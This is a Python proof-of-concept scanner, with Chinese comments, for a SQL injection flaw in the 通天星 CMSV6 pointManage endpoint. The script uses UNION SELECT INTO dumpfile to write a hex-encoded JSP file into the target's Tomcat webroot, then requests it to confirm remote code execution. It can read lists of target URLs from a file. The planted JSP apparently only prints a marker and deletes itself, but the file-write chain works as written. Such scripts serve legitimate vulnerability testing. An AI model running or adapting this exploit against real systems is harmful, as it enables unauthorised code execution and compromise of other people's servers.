#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import random
import string
import argparse
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def rand_base(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def check_vulnerability(url):
    filename = rand_base(6)
    # 第一个请求：通过SQL注入写入恶意的JSP文件
    upload_url = url.rstrip('/') + '/point_manage/merge'
    upload_headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    upload_data = (
        f"id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL"
        f" INTO dumpfile '../../tomcat/webapps/gpsweb/{filename}.jsp' FROM user_session a"
        " WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8"
    )

    try:
        response_upload = requests.post(upload_url, headers=upload_headers, data=upload_data.encode('utf-8'), verify=False, timeout=30)
        #print(f'Upload Response Status Code: {response_upload.status_code}')

        # 第二个请求：访问上传的JSP文件
        access_url = url.rstrip('/') + f'/{filename}.jsp'
        access_headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36'
        }
        response_access = requests.get(access_url, headers=access_headers, verify=False, timeout=30)
        #print(f'Access Response Status Code: {response_access.status_code}')
        #print(f'Access Response Body: {response_access.text}')

        if response_upload.status_code == 200 and response_access.status_code == 200 and "zz010f" in response_access.text:
            print(f"{RED}URL [{url}] 存在通天星CMSV6 pointManage SQL注入可写入文件RCE漏洞{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
    except requests.exceptions.Timeout:
        print(f"URL [{url}] 请求超时，可能存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在通天星CMSV6 pointManage SQL注入可写入文件RCE漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
